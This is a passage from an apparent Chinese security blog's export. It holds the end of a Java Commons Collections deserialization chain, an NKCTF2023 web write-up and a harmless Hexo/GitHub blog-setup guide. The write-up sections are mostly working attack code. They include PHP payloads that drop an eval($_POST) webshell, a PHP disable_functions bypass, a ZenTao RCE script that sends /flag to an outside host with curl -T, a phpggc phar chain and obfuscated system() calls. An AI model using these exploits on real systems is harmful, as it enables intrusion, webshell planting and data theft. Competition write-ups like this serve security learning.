class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="comment">//直接向Set集合中添加TiedMapEntry，触发利用链</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser2.out&quot;</span>));</span><br><span class="line">        outputStream.writeObject(hashSet);</span><br><span class="line">        outputStream.close();</span><br><span class="line"> </span><br><span class="line">        ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser2.out&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>NKCTF2023-web</title>
    <url>/2023/03/27/NKCTF2023-web/</url>
    <content><![CDATA[<h1 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;welcome_to_NKCTF&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;echo &quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot; &gt;&gt; 1.php&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span>  <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arg=<span class="keyword">new</span> <span class="title class_">Hell0</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arg-&gt;func=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span> &gt;&gt; <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>



<p>访问1.php连接木马</p>
<h1 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?a=byGcY&amp;b=sonZ7y&amp;e=114514.1&amp;NS[CTF.go=1 HTTP/1.1</span><br><span class="line">Host: d9fbe0f1-0abe-4119-9637-a8dca25493de.node.yuzhian.com.cn:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1336</span><br><span class="line">Origin: http://d9fbe0f1-0abe-4119-9637-a8dca25493de.node.yuzhian.com.cn:8000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://d9fbe0f1-0abe-4119-9637-a8dca25493de.node.yuzhian.com.cn:8000/</span><br><span class="line">Cookie: _ga_KCSGQQ51ER=GS1.1.1679707283.11.0.1679707283.0.0.0; _ga=GA1.1.265554516.1678852156; td_cookie=3598715934</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5);</span><br></pre></td></tr></table></figure>





<h1 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h1><p>禁用的函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">passthru,exec,system,chroot,scandir,chgrp,chown,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,symlink,popepassthru,stream_socket_server,show_source</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span> &gt;&gt; qqq.php</span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">NKCTF=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">28</span>_%<span class="number">2</span>F_._%<span class="number">29</span>%<span class="number">5</span>B_%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_.%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B%<span class="number">24</span>_%<span class="number">3</span>D_.%<span class="number">24</span>__.%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_.%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B&amp;_POST=shell_exec&amp;_=<span class="keyword">echo</span> <span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span> &gt;&gt; qqq.php</span><br></pre></td></tr></table></figure>

<p>访问qqq.php</p>
<p>连接一句话木马即可</p>
<h1 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="comment"># &quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span></span><br><span class="line">    <span class="comment"># &quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    url1 = url + <span class="string">&#x27;/misc-captcha-user.html&#x27;</span></span><br><span class="line">    <span class="comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span></span><br><span class="line">    <span class="comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span></span><br><span class="line">    url3 = url + <span class="string">&#x27;repo-create.html&#x27;</span></span><br><span class="line">    url4 = url + <span class="string">&#x27;repo-edit-10000-10000.html&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=609469cguj3v629dl94jtkd8u8; lang=zh-cn; device=desktop; theme=default&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers2 = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=609469cguj3v629dl94jtkd8u8; lang=zh-cn; device=desktop; theme=default&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: url + <span class="string">&quot;/repo-edit-1-0.html&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data1 = <span class="string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;gid=&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;SCM=Subversion&amp;client=`curl -T /flag https://6j3032p266.goho.co`&#x27;</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = s.get(url1, proxies=proxies, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">        req3 = s.post(url3, data=data1, proxies=proxies, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, headers=headers2)</span><br><span class="line">        req4 = s.post(url4, data=data2, proxies=proxies, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, headers=headers2)</span><br><span class="line">        <span class="built_in">print</span>(req4.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;uid=&#x27;</span> <span class="keyword">in</span> req4.text:</span><br><span class="line">            <span class="built_in">print</span>(url, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="comment"># print(req4.text)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(check(<span class="string">&quot;http://674cdf20-a3c2-455c-aac6-1680648b46ef.node2.yuzhian.com.cn/&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/03/27/NKCTF2023-web/image-20230325161320191.png" class="" title="image-20230325161320191">

<img src="/2023/03/27/NKCTF2023-web/image-20230325161247227.png" class="" title="image-20230325161247227">







<h1 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc Monolog/RCE2 passthru &#x27;pwd&#x27; -p phar -o testinfo.ini</span><br><span class="line">#进行url编码</span><br><span class="line">URLENC_PAYLOAD=$(cat testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)</span><br><span class="line">#写入文件</span><br><span class="line">curl -sSkig &#x27;http://4325e908-bf4a-4f35-93a5-a4d2de9e7515.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -</span><br><span class="line">#触发反序列化</span><br><span class="line">curl -sSkig &#x27;http://4325e908-bf4a-4f35-93a5-a4d2de9e7515.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -</span><br></pre></td></tr></table></figure>

<p>没出来</p>
<h1 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h1><p>&#x2F;dede&#x2F;index.php</p>
<p>username:admin</p>
<p>password:admin</p>
<img src="/2023/03/27/NKCTF2023-web/image-20230327125553566.png" class="" title="image-20230327125553566">



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;ls /&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;cat /f*&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/03/27/NKCTF2023-web/image-20230327131133172.png" class="" title="image-20230327131133172">



<img src="/2023/03/27/NKCTF2023-web/image-20230327131542876.png" class="" title="image-20230327131542876">
]]></content>
      <categories>
        <category>CTFWP</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+github搭建博客</title>
    <url>/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ol>
<li>GitHub账号<br>需要有一个GitHub账号，没有的话到 官网 申请一个。<br>注册很简单，不懂的话可以参考 GitHub申请账号</li>
<li>安装Git<br> 在自己电脑上安装好Git，hexo部署到GitHub时要用。<br> 网上找篇教程</li>
<li>安装NodeJS<br>在自己电脑上安装好NodeJS，Hexo是基于NodeJS编写的，所以需要安装NodeJS和npm工具。<br>网上找篇教程</li>
</ol>
<h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>我们采用Hexo来创建我们的博客网站，Hexo 是一个基于NodeJS的静态博客网站生成器，使用Hexo不需开发，只要进行一些必要的配置即可生成一个个性化的博客网站，非常方便。点击进入 官网。</p>
<p>安装 Hexo</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>查看版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure>

<p>创建一个项目 hexo-blog 并初始化</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo init hexo-blog</span><br><span class="line"><span class="built_in">cd</span> hexo-blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>本地启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>


<p>浏览器访问 <a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p>
<img src="/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20230313232222727.png" class="" title="image-20230313232222727">





<h1 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h1><p>在<code>GitHub</code>上创建一个新的代码仓库用于保存我们的网页。</p>
<p>点击<code>Your repositories</code>，进入仓库页面。</p>
<p>点击<code>New</code>按钮，进入仓库创建页面。</p>
<p>填写仓库名，格式必须为<code>&lt;用户名&gt;.github.io</code>，然后点击<code>Create repository</code>。</p>
<p>点击<code>creating a new file</code>创建一个新文件，作为我们网站的主页。</p>
<h1 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h1><p>4.1生成SSH添加到GitHub</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。</p>
<p>可以用以下两条，检查一下你有没有输对</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure>



<p>然后创建SSH,一路回车</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure>

<p>在gitbash中，查看是否成功</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>



<p>如果失败更改端口(非必要不改后面容易出事)</p>
<p>操作方法：</p>
<p>进入~&#x2F;.ssh下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>


<p>创建一个config文件(这里我用的vim编辑器)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure>


<p>编辑文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>保存退出<br>检查是否成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>



<h1 id="将hexo部署到GitHub"><a href="#将hexo部署到GitHub" class="headerlink" title="将hexo部署到GitHub"></a>将hexo部署到GitHub</h1><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>



<p>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:c0rr1Y/c0rr1Y.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>



<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>



<p>若启动连接失败，输入以下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="模板导入"><a href="#模板导入" class="headerlink" title="模板导入"></a>模板导入</h1><p>在hexo项目根目录下执行操作clone主题</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>

<p>如果沒有 pug 以及 <a href="https://so.csdn.net/so/search?q=stylus&spm=1001.2101.3001.7020">stylus</a> 的渲染器，还需要下载，否则在项目运行时会报错：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>

<p>3、修改项目根目录下的_config.yml文件（称为站点配置文件），开启主题</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#theme: landscape</span></span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure>



<p>若出现乱码</p>
<p>原因是<a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a>在5.0之后把swig给删除了需要自己手动安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>





<h2 id="解决：hexo-github本地和线上图片不显示问题"><a href="#解决：hexo-github本地和线上图片不显示问题" class="headerlink" title="解决：hexo+github本地和线上图片不显示问题"></a>解决：hexo+github本地和线上图片不显示问题</h2><p>在搭载好hexo(butterfly)+github博客后（有道云笔记记录），新建博客无法图片问题，多方寻找网上的解决办法仍未解决，大多安装了hexo-asset-image插件来解决，但是本人多项测试后，均为无效，唯一有效的需要将图片格式转换为这样，但是以一个一个去转换非常麻烦，因此继续寻求解决办法，最终找到如下帖子：<a href="https://moeci.com/posts/hexo-typora/%EF%BC%8C%E8%BF%99%E4%BD%8D%E5%A4%A7%E4%BD%AC%E5%BC%80%E5%8F%91%E7%9A%84%E6%8F%92%E4%BB%B6%E6%98%AFhexo-asset-img%EF%BC%8C%E8%80%8C%E9%9D%9Ehexo-asset-image%EF%BC%8C%E7%BB%8F%E8%BF%87%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%9C%89%E6%95%88">https://moeci.com/posts/hexo-typora/，这位大佬开发的插件是hexo-asset-img，而非hexo-asset-image，经过测试，有效</a></p>
<p>1配置 <a href="https://so.csdn.net/so/search?q=Typora&spm=1001.2101.3001.7020">Typora</a> 偏好设置，如下图更改，此操作将图片文件保存路径: .&#x2F;${filename} 即保存到与 当前正在编辑的文件名相同的同级文件夹下。</p>
<img src="/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20230313233951219.png" class="" title="image-20230313233951219">



<p>修改_config.yml中的post_asset_folder，false 改为 true，这样修改后，每次 ‘hexo new page’ 生成新文章，都会在文章文件同级目录创建一个与文章文件名同名的文件夹，我们就在这里存放此文章的图片。</p>
<p>安装插件hexo-asset-img：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

<p>完成安装</p>
<h2 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;about&quot;</span></span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo new “name”       <span class="comment"># 新建文章</span></span><br><span class="line"></span><br><span class="line">hexo new page “name”  <span class="comment"># 新建页面</span></span><br><span class="line"></span><br><span class="line">hexo g                <span class="comment"># 生成页面</span></span><br><span class="line"></span><br><span class="line">hexo d                <span class="comment"># 部署</span></span><br><span class="line"></span><br><span class="line">hexo g -d             <span class="comment"># 生成页面并部署</span></span><br><span class="line"></span><br><span class="line">hexo s                <span class="comment"># 本地预览</span></span><br><span class="line"></span><br><span class="line">hexo clean            <span class="comment"># 清除缓存和已生成的静态文件</span></span><br><span class="line"></span><br><span class="line">hexo <span class="built_in">help</span>             <span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>java代理模式</title>
    <url>/2023/03/23/java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="1-代理模式"><a href="#1-代理模式" class="headerlink" title="1. 代理模式"></a>1. 代理模式</h2><p>代理模式是一种比较好理解的设计模式。简单来说就是 <strong>我们使用代理对象来代替对真实对象(real object)的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</strong></p>
<p><strong>代理模式的主要作用是扩展目标对象的功能，比如说在目标对象的某个方法执行前后你可以增加一些自定义的操作。</strong></p>
<hr>
<p>举个列子;</p>
